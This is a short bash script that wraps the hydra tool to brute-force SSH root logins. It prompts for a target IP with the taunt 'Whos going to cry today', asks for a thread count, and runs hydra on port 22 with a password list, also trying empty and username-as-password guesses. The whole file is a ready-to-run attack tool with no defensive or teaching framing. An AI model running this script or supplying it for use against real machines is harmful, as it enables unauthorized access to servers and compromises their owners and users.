#! /bin/bash

echo "###################### SSH BRUTE FORCE ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en "ENTER NUMBER OF SSH THREADS (1-64)[recommend 64]:"
read count
echo "################# STARTING THREADS ##########################"
#packet=$1
#port=$2
#count=$3
cd /usr/bin
hydra $tarip ssh -s 22 -P password-list.txt -l root -e ns -t $count -vV
